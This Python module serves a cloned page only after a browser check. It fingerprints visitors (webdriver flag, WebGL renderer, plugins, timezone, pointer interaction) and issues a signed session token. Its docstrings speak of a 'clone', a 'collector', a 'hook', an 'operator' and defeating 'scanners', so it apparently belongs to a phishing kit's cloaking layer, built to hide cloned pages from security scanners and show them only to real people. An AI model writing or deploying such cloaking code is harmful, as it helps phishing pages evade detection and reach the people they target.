"""Pre-serve human challenge: the clone is not served on the first hit.

Measured gap (docs/DELIVERY_AND_HYGIENE_PLAN.md, item 1): the decision to serve the
clone was made from the TLS fingerprint and the User-Agent only, and the device
signals that would expose a headless browser are collected by the page's own collector
- i.e. AFTER the clone has already been handed over. A scanner with a clean UA and a
browser-shaped JA3 therefore got the page on hit #1, every time.

This module flips that around. A first visit gets a small brand-neutral interstitial
that asks the visitor to be a browser: it waits for real interaction (pointer
movement, a click, a key, a touch) and reads the passive tells a headless client
usually cannot fake consistently (WebGL renderer, plugin list, timezone, languages,
hardware concurrency, touch on a mobile UA). Only then does the server issue a signed,
session-bound, short-lived token - and only a request carrying that token gets the
clone. A scanner that does not run the script, or runs it without interacting, stays
on the interstitial for good.

Two limits: an operator must not be surprised that a first request from a real
person costs one extra round trip (it is ~1-2 s and looks like an ordinary
"checking your browser" step), and a determined automation stack that drives a real
browser with a real mouse *will* pass - this raises the cost, it does not make the
page unreachable. Nothing here inspects the visitor's network.
"""
import base64
import hashlib
import hmac
import html
import json
import secrets
import time

__all__ = ["Challenge", "score_signals", "VERIFY_PATH"]

VERIFY_PATH = "/__bh/verify"

# the reasons a visit fails, in the order they are checked
HEADLESS_REASONS = {
    "webdriver": "navigator.webdriver is set",
    "no_languages": "no languages reported",
    "no_timezone": "no timezone reported",
    "swiftshader": "software renderer (SwiftShader/llvmpipe/Mesa)",
    "no_plugins": "no plugins on a desktop browser",
    "no_touch": "a mobile user agent without touch support",
    "no_interaction": "no pointer, click, key or touch event",
    "no_js": "the challenge script never reported back",
}


def _js_str(value):
    """A value that is safe inside an inline <script>.

    `json.dumps` escapes quotes but NOT `</`, so a request path containing
    `</script><script>...` closed the tag and injected script into the interstitial
    (measured). `<`, `>` and `&` are written as JSON unicode escapes, which is still
    valid JSON and JS.
    """
    return (json.dumps(str(value)).replace("<", "\\u003c").replace(">", "\\u003e")
            .replace("&", "\\u0026"))


def _truthy(v):
    return v is True or str(v).lower() in ("1", "true", "yes")


def _int(v, default=0):
    """Junk must not raise: this value comes from the visitor."""
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def score_signals(signals, require_interaction=True):
    """(ok, score, reasons) for one reported signal set.

    Two tells are disqualifying on their own - `navigator.webdriver`, and the absence
    of real interaction when the caller requires it (which is the point of a
    challenge: a scanner that runs our script but never moves a mouse must not pass).
    Everything else subtracts from a score that starts at 100. The reasons are handed
    back verbatim so an operator can see WHY a visit was refused.
    """
    reasons = []
    hard = []
    score = 100
    s = signals if isinstance(signals, dict) else {}

    if _truthy(s.get("webdriver")):
        hard.append(HEADLESS_REASONS["webdriver"])
        score -= 60
    if require_interaction and _int(s.get("interactions")) <= 0:
        hard.append(HEADLESS_REASONS["no_interaction"])
        score -= 30
    if not s.get("languages"):
        reasons.append(HEADLESS_REASONS["no_languages"])
        score -= 15
    if not s.get("timezone"):
        reasons.append(HEADLESS_REASONS["no_timezone"])
        score -= 15
    renderer = str(s.get("gl_renderer") or "").lower()
    if any(t in renderer for t in ("swiftshader", "llvmpipe", "mesa",
                                   "software rasterizer")):
        reasons.append(HEADLESS_REASONS["swiftshader"])
        score -= 25
    ua = str(s.get("ua") or "")
    mobile = any(t in ua.lower() for t in ("android", "iphone", "ipad", "mobile"))
    if not mobile and _int(s.get("plugins")) == 0 and "chrome" in ua.lower():
        reasons.append(HEADLESS_REASONS["no_plugins"])
        score -= 10
    if mobile and not _truthy(s.get("touch")):
        reasons.append(HEADLESS_REASONS["no_touch"])
        score -= 15

    all_reasons = hard + reasons
    ok = score >= 60 and not hard
    return ok, max(0, score), all_reasons


class Challenge:
    """Issues and checks the token that lets a verified visitor through."""

    def __init__(self, secret=None, ttl=900, require_interaction=True,
                 min_score=60, brand="", wait_ms=2500):
        self.secret = secret or secrets.token_bytes(32)
        self.ttl = int(ttl)
        self.require_interaction = bool(require_interaction)
        self.min_score = int(min_score)
        self.brand = brand or ""
        self.wait_ms = int(wait_ms)
        self.refusals = []            # (ts, reasons, score) for the operator
        self.max_refusals = 200

    # ------------------------------------------------------------- tokens ==
    def issue(self, sid, now=None):
        """A token bound to one session and valid for `ttl` seconds."""
        ts = int(now if now is not None else time.time())
        body = f"{sid}.{ts}"
        mac = hmac.new(self.secret, body.encode(), hashlib.sha256).hexdigest()[:32]
        return base64.urlsafe_b64encode(f"{body}.{mac}".encode()).decode().rstrip("=")

    def verify(self, token, sid, now=None):
        """True only for an untampered, unexpired token issued to THIS session."""
        if not token or not sid:
            return False
        try:
            pad = "=" * (-len(str(token)) % 4)
            raw = base64.urlsafe_b64decode(str(token) + pad).decode()
            body, mac = raw.rsplit(".", 1)          # body is "<sid>.<ts>"
            got_sid, got_ts = body.rsplit(".", 1)
        except Exception:
            return False
        want = hmac.new(self.secret, body.encode(), hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(want, mac):
            return False
        if got_sid != sid:
            return False
        try:
            ts = int(got_ts)
        except ValueError:
            return False
        now = int(now if now is not None else time.time())
        return 0 <= (now - ts) <= self.ttl

    # -------------------------------------------------------------- verdict ==
    def judge(self, signals, now=None):
        ok, score, reasons = score_signals(signals,
                                          require_interaction=self.require_interaction)
        if ok and score < self.min_score:
            ok = False
            reasons = reasons + [f"score {score} < {self.min_score}"]
        if not ok:
            self.refusals.append((int(now if now is not None else time.time()),
                                  reasons, score))
            while len(self.refusals) > self.max_refusals:
                self.refusals.pop(0)
        return ok, score, reasons

    # ---------------------------------------------------------------- page ==
    def page(self, next_url, verify_url=VERIFY_PATH, brand=None):
        """The interstitial. It imitates nothing and carries no hook, no collector and
        no brand: the only thing it does is ask the visitor to be a browser."""
        # falsy, not `is not None`: an empty brand used to render an empty <title>
        title = html.escape(brand or self.brand or "Just a moment")
        next_js = _js_str(next_url)
        verify_js = _js_str(verify_url)
        return f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>{title}</title>
<style>
 html,body{{height:100%;margin:0}}
 body{{font:15px/1.5 system-ui,Segoe UI,Roboto,sans-serif;background:#f7f8fa;
      color:#20222a;display:flex;align-items:center;justify-content:center}}
 .box{{text-align:center;max-width:360px;padding:24px}}
 .ring{{width:34px;height:34px;margin:0 auto 14px;border:3px solid #d9dde5;
        border-top-color:#5b6472;border-radius:50%;animation:s .9s linear infinite}}
 @keyframes s{{to{{transform:rotate(360deg)}}}}
 p{{margin:0;color:#5b6472}}
</style></head><body>
<div class="box"><div class="ring"></div>
<p id="m">Checking your browser before continuing.</p></div>
<script>
(function () {{
  var next = {next_js}, verify = {verify_js};
  var signals = {{
    webdriver: (navigator.webdriver === true),
    languages: (navigator.languages || []).slice(0, 4),
    language: navigator.language || "",
    timezone: "", offset: null,
    plugins: (navigator.plugins && navigator.plugins.length) || 0,
    hardware: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    touch: ("ontouchstart" in window) || (navigator.maxTouchPoints > 0),
    screen: [screen.width, screen.height, window.devicePixelRatio || 1],
    ua: navigator.userAgent || "",
    gl_renderer: "", gl_vendor: "",
    interactions: 0, fractional: 0, dwell_ms: 0,
  }};
  try {{
    var o = Intl.DateTimeFormat().resolvedOptions();
    signals.timezone = o.timeZone || "";
    signals.offset = new Date().getTimezoneOffset();
  }} catch (e) {{}}
  try {{
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {{
      var d = gl.getExtension("WEBGL_debug_renderer_info");
      if (d) {{
        signals.gl_renderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL) || "";
        signals.gl_vendor = gl.getParameter(d.UNMASKED_VENDOR_WEBGL) || "";
      }} else {{
        signals.gl_renderer = gl.getParameter(gl.RENDERER) || "";
        signals.gl_vendor = gl.getParameter(gl.VENDOR) || "";
      }}
    }}
  }} catch (e) {{}}
  /* real interaction: a pointer with fractional coordinates is a real pointing
     device; a synthetic click from a driver usually is not */
  function hit(e) {{
    signals.interactions += 1;
    if (e && typeof e.clientX === "number" && e.clientX % 1 !== 0) {{
      signals.fractional += 1;
    }}
  }}
  ["pointermove", "pointerdown", "mousemove", "click", "keydown", "touchstart",
   "scroll"].forEach(function (t) {{
    window.addEventListener(t, hit, {{passive: true, capture: true}});
  }});
  var t0 = Date.now();
  function finish() {{
    signals.dwell_ms = Date.now() - t0;
    var body;
    try {{ body = JSON.stringify(signals); }} catch (e) {{ return; }}
    fetch(verify, {{method: "POST", credentials: "include", cache: "no-store",
                    headers: {{"Content-Type": "application/json"}}, body: body}})
      .then(function (r) {{ return r.json(); }})
      .then(function (d) {{
        if (d && d.ok) {{ location.replace(next); return; }}
        document.getElementById("m").textContent =
          "This browser could not be verified. Reload to try again.";
      }})
      .catch(function () {{
        document.getElementById("m").textContent =
          "This browser could not be verified. Reload to try again.";
      }});
  }}
  setTimeout(finish, {self.wait_ms});
}})();
</script></body></html>
"""
